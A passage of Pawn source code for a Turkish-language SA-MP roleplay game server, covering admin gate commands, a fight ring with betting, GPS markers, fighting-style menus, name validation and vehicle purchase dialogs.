		Gate[i][gbirlik] = 255;
		Gate[i][gint] = GetPlayerInterior(playerid);
		Gate[i][gvw] = GetPlayerVirtualWorld(playerid);
		Gate[i][gobje] = CreateDynamicObject(Gate[i][gmodel], Gate[i][gx], Gate[i][gy], Gate[i][gz], 0,0,Gate[i][grz], .worldid=Gate[i][gvw], .interiorid=Gate[i][gint]);
		Gate[i][gdurum] = 0;
		ObjeKurdu(playerid);
		new mstring[128];
		format(mstring, sizeof(mstring), "Baþarýyla gate kurdunuz.ID:%d",i);
		Bilgi(playerid,mstring);
		Streamer_Update(playerid);
		GateKaydet(i);
	}
	else if(Buysa("git",nstring))
	{
		if(gmodell == -1) return Kullanim(playerid, "/agate git [gate id]");
		if(!IsValidDynamicObject(Gate[gmodell][gobje])) return Hata(playerid, "Hatalý gateid belirttiniz.");
		DONDUR(playerid);
		SetPlayerPos(playerid, Gate[gmodell][gx], Gate[gmodell][gy], Gate[gmodell][gz]+1);
		SetPlayerInterior(playerid, Gate[gmodell][gint]);
		SetPlayerVirtualWorld(playerid, Gate[gmodell][gvw]);
		COZ(playerid);
	}
	else if(Buysa("texture",nstring))
	{
	    if(_tModel == -1 || isnull(_tName1) || isnull(_tName2)) return Kullanim(playerid, "/agate texture [gateid] [modelid] [txd name] [texture name]");
		Gate[gmodell][gtmodel] = _tModel;
		format(Gate[gmodell][gtname1], 32, "%s", _tName1);
		format(Gate[gmodell][gtname2], 32, "%s", _tName2);
		GateKaydet(gmodell);
		GateTextureVer(gmodell);
		Bilgi(playerid, "Gate'in texture'sini deðiþtirdiniz.");
	}
	else if(Buysa("duzenle",nstring))
	{
	    if(gmodell == -1) return Kullanim(playerid, "/agate duzenle [gate id]");
	    if(!IsValidDynamicObject(Gate[gmodell][gobje])) return Hata(playerid, "Hatalý gateid belirttiniz.");
	    gateduzenle[playerid] = gmodell;
		//printf("/duzenle - %d",gmodell);
	    new mstring[256],nstring2[64],id=gateduzenle[playerid];
		format(nstring2, sizeof(nstring2), ""C7"EIGHTBORN - "C8"Gate[%d]",Gate[id][gid]);
		format(mstring, sizeof(mstring), "Model\t [%d]\nKapalý Pos\nAçýk Pos\nSahip\t [%s]\nBirlik\t [%d]",Gate[id][gmodel],SQLFromName(Gate[id][gsahip]),Gate[id][gbirlik]);
		ShowPlayerDialog(playerid, 242, DIALOG_STYLE_LIST, nstring2, mstring, "Tamam", "Ýptal");
	}
	else if(Buysa("id",nstring))
	{
	    if(gategoruyor[playerid] == 0)
	    {
			gategoruyor[playerid] = 1;
			new mstring[64];
			for(new i;i<MAX_GATE;i++)
	  		{
				if(IsValidDynamicObject(Gate[i][gobje]))
				{
					format(mstring, sizeof(mstring), "{FFFFFF}Gate[{fb5a02}%d{FFFFFF}]",i);
				    Gate[i][glabel] = CreatePlayer3DTextLabel(playerid,mstring,0x008080FF,Gate[i][gx],Gate[i][gy],Gate[i][gz]+1.3,5.0);
				}
			}
			Ipucu(playerid, "GateID'leri görüyorsunuz.");
		}
		else if(gategoruyor[playerid] == 1)
		{
		    gategoruyor[playerid] = 0;
			for(new i;i<MAX_GATE;i++)
	  		{
				if(IsValidDynamicObject(Gate[i][gobje]))
				{
				    DeletePlayer3DTextLabel(playerid,Gate[i][glabel]);
				}
			}
			Ipucu(playerid, "GateID'leri görmüyorsunuz.");
		}
	}
	else if(Buysa("yid",nstring))
	{
        for(new i;i<MAX_GATE;i++)
	    {
	        if(!IsValidDynamicObject(Gate[i][gobje])) continue;
	        if(IsPlayerNearDynamicObject(playerid, Gate[i][gobje]))
	        {
		        SendClientMessage(playerid, -1, "Yakýnýnýzdaki Gateler:");
			    new mstring[400];
			    format(mstring, sizeof(mstring),"SQLID:%d - ID:%d - Model:%d - X:%f - Y:%f - Z:%f - Sahip:%s - Birlik:%d",Gate[i][gid],i,Gate[i][gmodel],Gate[i][gx],Gate[i][gy],Gate[i][gz],SQLFromName(Gate[i][gsahip]),Gate[i][gbirlik]);
				SendClientMessage(playerid, -1, mstring);
			}
		}
	}
	else if(Buysa("liste",nstring))
	{
	    SendClientMessage(playerid, -1,"__________GATE_________");
	    for(new i;i<MAX_GATE;i++)
	    {
	        if(!IsValidDynamicObject(Gate[i][gobje])) continue;
		    new mstring[400];
		    format(mstring, sizeof(mstring),"SQLID:%d - ID:%d - Model:%d - X:%f - Y:%f - Z:%f - Sahip:%s - Birlik:%d",Gate[i][gid],i,Gate[i][gmodel],Gate[i][gx],Gate[i][gy],Gate[i][gz],SQLFromName(Gate[i][gsahip]),Gate[i][gbirlik]);
			SendClientMessage(playerid, -1, mstring);
		}
	}
	else if(Buysa("sil",nstring))
	{
	    if(gmodell == -1) return Kullanim(playerid, "/agate sil [gate id]");
	    if(!IsValidDynamicObject(Gate[gmodell][gobje])) return Hata(playerid, "Hatalý gateid.");
	    new id=gmodell;
	    Gate[id][gmodel] = 0;
	    Gate[id][gx] = 0;
	    Gate[id][gy] = 0;
	    Gate[id][gz] = 0;
	    Gate[id][grx] = 0;
	    Gate[id][gry] = 0;
	    Gate[id][grz] = 0;
	    Gate[id][gox] = 0;
	    Gate[id][goy] = 0;
	    Gate[id][goz] = 0;
	    Gate[id][gorx] = 0;
	    Gate[id][gory] = 0;
	    Gate[id][gorz] = 0;
	    Gate[id][gdurum] = 0;
	    Gate[id][gsahip] = -1;
	    Gate[id][gbirlik] = 255;
	    DestroyDynamicObject(Gate[id][gobje]);
	    new query[128];
	    format(query, sizeof(query), "DELETE FROM `gate` WHERE `id` = '%d'",Gate[id][gid]);
	    mysql_tquery(1, query);
	    Gate[id][gid] = 0;
	    Bilgi(playerid, "Gate'i sildiniz.");
	    if(gategoruyor[playerid] == 1)
	    {
	    	DeletePlayer3DTextLabel(playerid,Gate[id][glabel]);
	    }
	}
	return 1;
}
CMD:dovusduzenle(playerid, params[])
{
	if(Girdi[playerid])
	{
		if(!IsPlayerInRangeOfPoint(playerid, 25, 2611.35, -1589.09, -71.0938)) return Hata(playerid, "Dövüþ ringinde deðilsiniz.");
		if(Birlik[Karakter[playerid][birlik]][ftip] != DOVUS) return Hata(playerid, "Dövüþ birliðinde deðilsiniz.");
		new mstring[400],dtext[12];
		dtext = "Baþlamadý";
		if(dovus == true) dtext = "Baþladý";
		format(mstring, sizeof(mstring), "Dövüþ\t{B3B3B3}Mavi Taraf\t[ {FFFFFF}%s{B3B3B3} ]\nDövüþ\t{B3B3B3}Kýrmýzý Taraf\t[ {FFFFFF}%s{B3B3B3} ]\nDövüþ\t{B3B3B3}Süre\t[ {FFFFFF}%f Dakika{B3B3B3} ]\nDövüþ\t{B3B3B3}%s",OyuncuAdiniBul(mavitaraf),OyuncuAdiniBul(kirmizitaraf),dovussure,dtext);
		ShowPlayerDialog(playerid, 246, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Dövüþ", mstring, "Tamam", "Ýptal");
	}
	return 1;
}
forward DovusBasla();
public DovusBasla()
{
	dovusex = true;
	COZ(mavitaraf);
	COZ(kirmizitaraf);
	foreach(new i : Player)
	{
	    if(IsPlayerInRangeOfPoint(i, 30, 2612.3662,-1606.3315,-70.2262))
	    {
	        SendClientMessage(i, -1, "{B3B3B3}((Dövüþ baþladý..))");
	    }
	}
}
DovusIptal()
{
	new mstring[128];
	foreach(new i : Player)
	{
	    if(bahistip[i] > 0)
	    {
	        Bilgi(i, "Dövüþ iptal olduðu için paranýz geri geldi.");
	        GivePlayerCash(i, bahispara[i]);
	        format(mstring, sizeof(mstring), "Bahis iptal oldu, $%d parasý geri geldi.",bahispara[i]);
			Log(i, mstring);
	        bahispara[i] = 0;
			bahistip[i] = 0;
	    }
	}
	DovusBitir();
}
forward DovusBitir();
public DovusBitir()
{
	new mstring[128];
	if(kazanantaraf == 1) format(mstring, sizeof(mstring), "{B3B3B3}((Dövüþ sona erdi kazanan mavi taraf [%s]))",OyuncuAdiniBul(mavitaraf));
	if(kazanantaraf == 2) format(mstring, sizeof(mstring), "{B3B3B3}((Dövüþ sona erdi kazanan kýrmýzý taraf [%s]))",OyuncuAdiniBul(kirmizitaraf));
	foreach(new i : Player)
	{
	    if(IsPlayerInRangeOfPoint(i, 30, 2612.3662,-1606.3315,-70.2262))
	    {
			if(kazanantaraf != 0) SendClientMessage(i, -1, mstring);
	    }
	}
	DONDUR(mavitaraf);
	SetPlayerPos(mavitaraf, 2613.9473,-1599.0421,-71.1094);
	SetPlayerInteriorEx(mavitaraf, 1);
	SetPlayerVirtualWorld(mavitaraf, 373);
	SetTimerEx("UnfreezeTimer", 2500, false, "u", mavitaraf);
	RemovePlayerAttachedObject(mavitaraf, 7);
	RemovePlayerAttachedObject(mavitaraf, 8);
	DONDUR(kirmizitaraf);
	SetPlayerPos(kirmizitaraf, 2609.7227,-1599.0240,-71.1094);
	SetPlayerInteriorEx(kirmizitaraf, 1);
	SetPlayerVirtualWorld(kirmizitaraf, 373);
	SetTimerEx("UnfreezeTimer", 2500, false, "u", kirmizitaraf);
	RemovePlayerAttachedObject(kirmizitaraf, 7);
	RemovePlayerAttachedObject(kirmizitaraf, 8);
	dovus = false;
	dovusex = false;
	kazanantaraf = 0;
	mavitaraf = -1;
	kirmizitaraf = -1;
	foreach(new i : Player)
	{
	    bahispara[i] = 0;
		bahistip[i] = 0;
	}
}
IsVehicleSeatUsed(vehicleid, seat)
{
    for (new i = 0; i < MAX_PLAYERS; i++) if (IsPlayerConnected(i) && IsPlayerInVehicle(i, vehicleid) && GetPlayerVehicleSeat(i) == seat) {
        return 1;
    }
    return 0;
}

RemoveFromVehicle(playerid)
{
    if (IsPlayerInAnyVehicle(playerid))
    {
        static
            Float:fX,
            Float:fY,
            Float:fZ;

        GetPlayerPos(playerid, fX, fY, fZ);
        SetPlayerPos(playerid, fX, fY, fZ + 1.5);
    }
    return 1;
}

GetAvailableSeat(vehicleid, start = 1)
{
    new seats = GetVehicleMaxSeats(vehicleid);

    for (new i = start; i < seats; i ++) if (!IsVehicleSeatUsed(vehicleid, i)) {
        return i;
    }
    return -1;
}

stock GetVehicleMaxSeats(vehicleid)
{
	return MaxSeats[(GetVehicleModel(vehicleid) - 400)];
}

stock GetVehicleMaxSeatsEx(modelid)
{
	return MaxSeats[modelid - 400];
}

CMD:gpsler(playerid, params[])
{
	if(Karakter[playerid][adminlevel] < 1 || !Girdi[playerid] || !AKontrol(playerid)) return 1;
	new mnstring[256];
	SendClientMessage(playerid, -1, "______________GPS_______________");
	for(new i;i<MAX_GPS;i++)
 	{
		if(!isnull(Gps[i][gisim]) && Gps[i][gekleyen] != -1)
		{
			format(mnstring, sizeof(mnstring), "SQLID:%d - ID:%d - Ýsim:%s - Ekleyen:%s",Gps[i][gid],i,Gps[i][gisim],SQLFromName(Gps[i][gekleyen]));
			SendClientMessage(playerid, -1, mnstring);
		}
	}
	return 1;
}

CMD:agpskaldir(playerid, params[])
{
	if(Karakter[playerid][adminlevel] < 1 || !Girdi[playerid] || !AKontrol(playerid)) return 1;
	new gid2;
	if(sscanf(params,"d",gid2)) return Kullanim(playerid, "/agpskaldir [gps id]");
	Gps[gid2][gx] = 0;
 	Gps[gid2][gy] = 0;
	Gps[gid2][gz] = 0;
	format(Gps[gid2][gisim], 32, "");
	Gps[gid2][gekleyen] = -1;
	DestroyDynamic3DTextLabel(Gps[gid2][glabel]);
	Bilgi(playerid, "GPS'i kaldýrdýnýz.");
	new query[128];
	format(query, sizeof(query), "DELETE FROM `gps` WHERE id = %d",Gps[gid2][gid]);
    mysql_tquery(1, query);
	return 1;
}

CMD:gps(playerid, params[])
{
	new nstring[16],mstring[128];
	if(isnull(params)) return Kullanim(playerid, "/gps [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: kur, kaldir, liste");
    sscanf(params,"s[16]s[128]",nstring,mstring);
    if(meslekbul[playerid] == 1) return Hata(playerid, "Önce meslek bul komutunu kapatýnýz.");
	if(Buysa("liste",nstring))
	{
	    if(SevkiyatGorev[playerid] || PizzaGorevde[playerid] || SicilTGorevde[playerid] || LojGorevde[playerid] || PizzaGorevde[playerid] || KamGorevde[playerid] || EleGorevde[playerid] || otobuste[playerid] || GetPVarInt(playerid, "TGorev") || GetPVarInt(playerid, "TIsbasi"))
		{
		    Hata(playerid, "Þuan bu komutu kullanamazsýnýz.");
		    return 1;
		}
	    new mnstring[2048];
	    for(new i;i<MAX_GPS;i++)
	    {
			if(!isnull(Gps[i][gisim]) && Gps[i][gekleyen] != -1) format(mnstring, sizeof(mnstring), "%s(ID:%d)\t%s\n",mnstring,i,Gps[i][gisim]);
	    }
	    ShowPlayerDialog(playerid, 251, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"GPS", mnstring, "GPS Ayarla", "Ýptal");
	}
	else if(Buysa("kur",nstring))
	{
	    if(Karakter[playerid][pGPS] != 1) return Hata(playerid, "GPS'iniz yok.");
	    if(Karakter[playerid][level] < 5) return Hata(playerid, "GPS kurmak için en az 5 seviye olmanýz gerekmektedir.");
	    if(isnull(mstring)) return Kullanim(playerid, "/gps kur [GPS ismi]");
	    for(new i;i<MAX_GPS;i++)
	    {
			if(Gps[i][gekleyen] == Karakter[playerid][sqlid])
			{
				Hata(playerid, "Zaten kurulu gps'iniz bulunmaktadýr, kaldýrmak için ''/gps kaldir''.");
			    return 1;
			}
	    }
	    if(strlen(mstring) > 32) return Hata(playerid, "GPS isminiz bu kadar uzun olamaz.");
		new query[400],Float:pPos[3];
		GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
		format(mstring, sizeof(mstring), "%s", EscapeString(mstring));
		format(query, sizeof(query), "INSERT INTO `gps` (`isim`,`ekleyen`,`x`,`y`,`z`) VALUES ('%s','%d','%f','%f','%f')", mstring, Karakter[playerid][sqlid], pPos[0], pPos[1], pPos[2]);
		new Cache:cache = mysql_query(query,true);
		new i = cache_insert_id();
		cache_delete(cache);
		Gps[i][gid] = i;
		Gps[i][gx] = pPos[0];
		Gps[i][gy] = pPos[1];
		Gps[i][gz] = pPos[2];
		Gps[i][gekleyen] = Karakter[playerid][sqlid];
		format(Gps[i][gisim], 32, "%s",mstring);
		format(mstring, sizeof(mstring), "{fb5a02}GPS[%d]\n{FFFFFF}%s",i,Gps[i][gisim]);
  		Gps[i][glabel] = CreateDynamic3DTextLabel(mstring,0x008080FF,Gps[i][gx],Gps[i][gy],Gps[i][gz],15);
	    format(mstring, sizeof(mstring), "Baþarýyla gps kurdunuz.(ID:%d - Ýsim:%s)",i,Gps[i][gisim]);
	    Bilgi(playerid, mstring);
	    Karakter[playerid][pGPS] = 0;
	}
	else if(Buysa("kaldir",nstring))
	{
	    if(Karakter[playerid][pGPS] != 1) return Hata(playerid, "GPS'iniz yok.");
	    new kurmus=0;
	    for(new i;i<MAX_GPS;i++)
	    {
			if(Gps[i][gekleyen] == Karakter[playerid][sqlid])
			{
				kurmus=i;
				break;
			}
	    }
	    if(kurmus != 0)
	    {
	        Gps[kurmus][gx] = 0;
	        Gps[kurmus][gy] = 0;
	        Gps[kurmus][gz] = 0;
	        format(Gps[kurmus][gisim], 32, "");
	        Gps[kurmus][gekleyen] = -1;
	        DestroyDynamic3DTextLabel(Gps[kurmus][glabel]);
	        Bilgi(playerid, "GPS'inizi kaldýrdýnýz.");
	        new query[128];
	        format(query, sizeof(query), "DELETE FROM `gps` WHERE id = %d",Gps[kurmus][gid]);
	        mysql_tquery(1, query);
	    }
	    else
	    {
	        Hata(playerid, "GPS kurmamýþsýnýz, gps kurmak için ''/gps kur''.");
	    }
	}
	return 1;
}
CMD:dovusstil(playerid, params[])
{
	if(!Girdi[playerid] && !IsPlayerConnected(playerid)) return 0;
    DovusStilMenu(playerid);
	return 1;
}
DovusStilMenu(playerid)
{
	new btext[32],kftext[32],khtext[32],gktext[32],_etext[32];
	btext = "{990000}Öðrenilmedi";
	if(Karakter[playerid][box] == 1 || Karakter[playerid][box] == 2) btext = ""C3"Öðreniliyor";
	if(Karakter[playerid][box] == 3) btext = "{008000}Öðrenilmiþ";
	kftext = "{990000}Öðrenilmedi";
	if(Karakter[playerid][kungfu] == 1 || Karakter[playerid][box] == 2) kftext = ""C3"Öðreniliyor";
	if(Karakter[playerid][kungfu] == 3) kftext = "{008000}Öðrenilmiþ";
	khtext = "{990000}Öðrenilmedi";
	if(Karakter[playerid][kneehead] == 1 || Karakter[playerid][kneehead] == 2) khtext = ""C3"Öðreniliyor";
	if(Karakter[playerid][kneehead] == 3) khtext = "{008000}Öðrenilmiþ";
	gktext = "{990000}Öðrenilmedi";
	if(Karakter[playerid][grabkick] == 1 || Karakter[playerid][grabkick] == 2) gktext = ""C3"Öðreniliyor";
	if(Karakter[playerid][grabkick] == 3) gktext = "{008000}Öðrenilmiþ";
	_etext = "{990000}Öðrenilmedi";
	if(Karakter[playerid][elbow] == 1 || Karakter[playerid][elbow] == 2) _etext = ""C3"Öðreniliyor";
	if(Karakter[playerid][elbow] == 3) _etext = "{008000}Öðrenilmiþ";
	new mstring[512];
	format(mstring, sizeof(mstring), "Dövüþ Stili\tDurum\tÝlerleme\nNormal\nBoxing\t%s\t{FFFFFF} (%d/3)\nKungFu\t%s\t{FFFFFF} (%d/3)\nKneeHead\t%s\t{FFFFFF} (%d/3)\nGrabKick\t%s\t{FFFFFF} (%d/3)\nElbow\t%s\t{FFFFFF} (%d/3)",btext,Karakter[playerid][box],kftext,Karakter[playerid][kungfu],khtext,Karakter[playerid][kneehead],gktext,Karakter[playerid][grabkick],_etext,Karakter[playerid][elbow]);
	return ShowPlayerDialog(playerid, 256, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Dövüþ Stili", mstring, "Seç", "Ýptal");
}

forward bool:_IsARPName(name[], min_underscores = 1, max_uderscores = 3, bool:first_letter_upper = true);
stock bool:_IsARPName(name[], min_underscores = 1, max_uderscores = 3, bool:first_letter_upper = true)
{
	new tempname[MAX_PLAYER_NAME];
	strcat(tempname, name);

	#pragma unused name

	new count;
	new pos;
	new dest[MAX_PLAYER_NAME];

	while ((pos = strfind(tempname, "_")) != -1)
	{
		strmid((dest[0] = EOS, dest), tempname, 0, pos, MAX_PLAYER_NAME);
		strdel(tempname, 0, (pos + 1));

		if (! dest[0])
			return false;

		if (first_letter_upper && dest[0] >= 'a')
		    return false;

		for (new i, j = strlen(dest); i < j; i++)
		{
			if (dest[i] < 'A' || dest[i] > 'z' || dest[i] == ' ')
			    return false;
		}
		count++;
	}

	if (count < min_underscores)
	    return false;

	if (! tempname[0])
		return false;

	if (first_letter_upper && tempname[0] >= 'a')
 		return false;

	for (new i, j = strlen(tempname); i < j; i++)
	{
		if (tempname[i] < 'A' || tempname[i] > 'z' || tempname[i] == ' ')
			return false;
	}
	count++;

	if (count > max_uderscores)
		return false;

	return true;
}

SSAracSatinalMenu(playerid)
{
    new _modelid = SectigiArac[playerid],nstring[128],mstring[1024],_htext[64],_afiyat,_r1text[64],_r2text[64];
	_htext = "Yok";
	_r1text = "";
	_r2text = "";
	_afiyat = SSGaleriFiyat(_modelid);
	if(SectigiHizSabit[playerid])
	{
		format(_htext,sizeof(_htext),"Var[+{008000}${FFFFFF}3500{B3B3B3}]");
		_afiyat += 3500;
	}
	if(1 < SectigiAracRenk1[playerid] < 10)
	{
	    format(_r1text, sizeof(_r1text), "Özel Renk"C2"[+{008000}$"C1"1500"C2"]");
	    _afiyat += 1500;
	}
	if(1 < SectigiAracRenk2[playerid] < 10)
	{
        format(_r2text, sizeof(_r2text), "Özel Renk"C2"[+{008000}$"C1"1500"C2"]");
	    _afiyat += 1500;
	}
	if(SectigiAracRenk1[playerid] > 10)
	{
	    format(_r1text, sizeof(_r1text), "Özel Renk"C2"[+{008000}$"C1"2500"C2"]");
	    _afiyat += 2500;
	}
	if(SectigiAracRenk2[playerid] > 10)
	{
        format(_r2text, sizeof(_r2text), "Özel Renk"C2"[+{008000}$"C1"2500"C2"]");
	    _afiyat += 2500;
	}
	format(nstring, sizeof(nstring), "Super Sport Galeri - Araç Satýnal [ {B3B3B3}%s(%d) {FFFFFF}]", VehicleName[_modelid-400][0], _modelid);
	format(mstring, sizeof(mstring), "Renk 1\t\t ( %s%d{FFFFFF} )\t %s\nRenk 2\t\t ( %s%d{FFFFFF} )\t %s\nHýz Sabitleme\t ( {B3B3B3}%s{FFFFFF} )\nFiyat\t\t ( {B3B3B3}%d{FFFFFF} )\nOnayla",
    HexRenkVer(AllCarColors[SectigiAracRenk1[playerid]]),
	SectigiAracRenk1[playerid],
	_r1text,
	HexRenkVer(AllCarColors[SectigiAracRenk2[playerid]]),
	SectigiAracRenk2[playerid],
	_r2text,
	_htext,
	_afiyat);
	AldigiAracFiyati[playerid] = _afiyat;
	return ShowPlayerDialog(playerid, 302, DIALOG_STYLE_LIST, nstring, mstring, "Seç", "Ýptal");
}

GaleriAracSatinalMenu(playerid)
{
    new _modelid = SectigiArac[playerid],nstring[128],mstring[1024],_htext[64],_afiyat,_r1text[64],_r2text[64];
	_htext = "Yok";
	_r1text = "";
	_r2text = "";
	_afiyat = GaleriFiyat(_modelid);
	if(SectigiHizSabit[playerid])
	{
		format(_htext,sizeof(_htext),"Var[+{008000}${FFFFFF}3500{B3B3B3}]");
		_afiyat += 3500;
	}
	if(1 < SectigiAracRenk1[playerid] < 10)
	{
	    format(_r1text, sizeof(_r1text), "Özel Renk"C2"[+{008000}$"C1"1500"C2"]");
	    _afiyat += 1500;
	}
	if(1 < SectigiAracRenk2[playerid] < 10)
	{
        format(_r2text, sizeof(_r2text), "Özel Renk"C2"[+{008000}$"C1"1500"C2"]");
	    _afiyat += 1500;
	}
	if(SectigiAracRenk1[playerid] > 10)
	{
	    format(_r1text, sizeof(_r1text), "Özel Renk"C2"[+{008000}$"C1"2500"C2"]");
	    _afiyat += 2500;
	}
	if(SectigiAracRenk2[playerid] > 10)
	{
        format(_r2text, sizeof(_r2text), "Özel Renk"C2"[+{008000}$"C1"2500"C2"]");
	    _afiyat += 2500;
	}
	format(nstring, sizeof(nstring), "Normal Galeri - Araç Satýnal [ {B3B3B3}%s(%d) {FFFFFF}]", VehicleName[_modelid-400][0], _modelid);
	format(mstring, sizeof(mstring), "Renk 1\t\t ( %s%d{FFFFFF} )\t %s\nRenk 2\t\t ( %s%d{FFFFFF} )\t %s\nHýz Sabitleme\t ( {B3B3B3}%s{FFFFFF} )\nFiyat\t\t ( {B3B3B3}%d{FFFFFF} )\nOnayla",
    HexRenkVer(AllCarColors[SectigiAracRenk1[playerid]]),
	SectigiAracRenk1[playerid],
	_r1text,
	HexRenkVer(AllCarColors[SectigiAracRenk2[playerid]]),
	SectigiAracRenk2[playerid],
	_r2text,
	_htext,
	_afiyat);
	AldigiAracFiyati[playerid] = _afiyat;
	return ShowPlayerDialog(playerid, 365, DIALOG_STYLE_LIST, nstring, mstring, "Seç", "Ýptal");
}

DenizAracSatinalMenu(playerid)
{
    new _modelid = SectigiArac[playerid],nstring[128],mstring[1024],_htext[64],_afiyat,_r1text[64],_r2text[64];
	_htext = "Yok";
	_r1text = "";
	_r2text = "";
	_afiyat = floatround(AracFiyatBul(_modelid)*PazarlikKatSayi(playerid));
	if(1 < SectigiAracRenk1[playerid] < 10)
	{
	    format(_r1text, sizeof(_r1text), "Özel Renk"C2"[+{008000}$"C1"1500"C2"]");
	    _afiyat += 1500;
	}
	if(1 < SectigiAracRenk2[playerid] < 10)
	{
        format(_r2text, sizeof(_r2text), "Özel Renk"C2"[+{008000}$"C1"1500"C2"]");
	    _afiyat += 1500;
	}
	if(SectigiAracRenk1[playerid] > 10)
	{
	    format(_r1text, sizeof(_r1text), "Özel Renk"C2"[+{008000}$"C1"2500"C2"]");
	    _afiyat += 2500;
	}
	if(SectigiAracRenk2[playerid] > 10)
	{
        format(_r2text, sizeof(_r2text), "Özel Renk"C2"[+{008000}$"C1"2500"C2"]");
	    _afiyat += 2500;
	}
	format(nstring, sizeof(nstring), "Deniz Aracý Galeri - Araç Satýnal [ {B3B3B3}%s(%d) {FFFFFF}]", VehicleName[_modelid-400][0], _modelid);
	format(mstring, sizeof(mstring), "Renk 1\t\t ( %s%d{FFFFFF} )\t %s\nRenk 2\t\t ( %s%d{FFFFFF} )\t %s\nFiyat\t\t ( {B3B3B3}%d{FFFFFF} )\nOnayla",
    HexRenkVer(AllCarColors[SectigiAracRenk1[playerid]]),
	SectigiAracRenk1[playerid],
	_r1text,
	HexRenkVer(AllCarColors[SectigiAracRenk2[playerid]]),
	SectigiAracRenk2[playerid],
	_r2text,
	_afiyat);
	AldigiAracFiyati[playerid] = _afiyat;
	return ShowPlayerDialog(playerid, 464, DIALOG_STYLE_LIST, nstring, mstring, "Seç", "Ýptal");
}

HavaAracSatinalMenu(playerid)
{
    new _modelid = SectigiArac[playerid],nstring[128],mstring[1024],_htext[64],_afiyat,_r1text[64],_r2text[64];
	_htext = "Yok";
	_r1text = "";
	_r2text = "";
	_afiyat = floatround(AracFiyatBul(_modelid)*PazarlikKatSayi(playerid));
	if(1 < SectigiAracRenk1[playerid] < 10)
	{
	    format(_r1text, sizeof(_r1text), "Özel Renk"C2"[+{008000}$"C1"1500"C2"]");
	    _afiyat += 1500;
	}
	if(1 < SectigiAracRenk2[playerid] < 10)
	{
        format(_r2text, sizeof(_r2text), "Özel Renk"C2"[+{008000}$"C1"1500"C2"]");
	    _afiyat += 1500;
	}
	if(SectigiAracRenk1[playerid] > 10)
	{
	    format(_r1text, sizeof(_r1text), "Özel Renk"C2"[+{008000}$"C1"2500"C2"]");
	    _afiyat += 2500;
	}
	if(SectigiAracRenk2[playerid] > 10)
	{
        format(_r2text, sizeof(_r2text), "Özel Renk"C2"[+{008000}$"C1"2500"C2"]");
	    _afiyat += 2500;
	}
	format(nstring, sizeof(nstring), "Hava Aracý Galeri - Araç Satýnal [ {B3B3B3}%s(%d) {FFFFFF}]", VehicleName[_modelid-400][0], _modelid);
	format(mstring, sizeof(mstring), "Renk 1\t\t ( %s%d{FFFFFF} )\t %s\nRenk 2\t\t ( %s%d{FFFFFF} )\t %s\nFiyat\t\t ( {B3B3B3}%d{FFFFFF} )\nOnayla",
    HexRenkVer(AllCarColors[SectigiAracRenk1[playerid]]),
	SectigiAracRenk1[playerid],
	_r1text,
	HexRenkVer(AllCarColors[SectigiAracRenk2[playerid]]),
	SectigiAracRenk2[playerid],
	_r2text,
	_afiyat);
	AldigiAracFiyati[playerid] = _afiyat;
	return ShowPlayerDialog(playerid, 463, DIALOG_STYLE_LIST, nstring, mstring, "Seç", "Ýptal");
}

AracSatinalMenu(playerid)
{
	if(AracFiyatBul(SectigiArac[playerid]) == 0) return Hata(playerid, "Bu modelin stoðu bulunmamaktadýr.");
	new _modelid = SectigiArac[playerid],nstring[128],mstring[1024],_htext[64],_afiyat,_avergi,_akoltuk,
	_r1text[64],_r2text[64],_kilitfiyat,_alarmfiyat,_immofiyat;
	_htext = "Yok";
	_r1text = "";
	_r2text = "";
    _afiyat = floatround(AracFiyatBul(_modelid)*PazarlikKatSayi(playerid));
    _avergi = floatround(_afiyat/2000);
	if(SectigiHizSabit[playerid])
	{
		format(_htext,sizeof(_htext),"Var("DOLAR"$"C2"3500)");
		_afiyat += 3500;
	}
	if(1 < SectigiAracRenk1[playerid] < 10)
	{
	    format(_r1text, sizeof(_r1text), "Özel Renk"C2"("DOLAR"$"C2"1500)");
	    _afiyat += 1500;
	}
	if(1 < SectigiAracRenk2[playerid] < 10)
	{
        format(_r2text, sizeof(_r2text), "Özel Renk"C2"("DOLAR"$"C2"1500)");
	    _afiyat += 1500;
	}
	if(SectigiAracRenk1[playerid] > 10)
	{
	    format(_r1text, sizeof(_r1text), "Özel Renk"C2"("DOLAR"$"C2"2500)");
	    _afiyat += 2500;
	}
	if(SectigiAracRenk2[playerid] > 10)
	{
        format(_r2text, sizeof(_r2text), "Özel Renk"C2"("DOLAR"$"C1"2500"C2")");
	    _afiyat += 2500;
	}
	switch(SectigiKilit[playerid])
	{
	    case 0: _kilitfiyat = 0;
	    case 1: _kilitfiyat = 500;
	    case 2: _kilitfiyat = 1000;
	    case 3: _kilitfiyat = 1750;
	}
	switch(SectigiAlarm[playerid])
	{
	    case 0: _alarmfiyat = 0;
	    case 1: _alarmfiyat = 500;
	    case 2: _alarmfiyat = 1000;
	    case 3: _alarmfiyat = 1750;
	}
	switch(SectigiImmo[playerid])
	{
	    case 0: _immofiyat = 0;
	    case 1: _immofiyat = 500;
	    case 2: _immofiyat = 1000;
	    case 3: _immofiyat = 1750;
	}
	_afiyat += _kilitfiyat;
	_afiyat += _alarmfiyat;
	_afiyat += _immofiyat;
	_akoltuk = GetVehicleMaxSeatsEx(_modelid);
	format(nstring, sizeof(nstring), ""C7"EIGHTBORN - "C8"Araç Satýnal [ {B3B3B3}%s(%d) "C8"]", VehicleName[_modelid-400][0], _modelid);
	format(mstring, sizeof(mstring), "Renk 1\t\t ( %s%d{FFFFFF} )\t %s\nRenk 2\t\t ( %s%d{FFFFFF} )\t %s\nHýz Sabitleme\t ( {B3B3B3}%s{FFFFFF} )\nKilit Seviyesi\t ( {B3B3B3}%d{FFFFFF} "C2"(%d"DOLAR"$"C2") "C1")\nAlarm Seviyesi\t ( {B3B3B3}%d{FFFFFF} "C2"(%d"DOLAR"$"C2") "C1")",
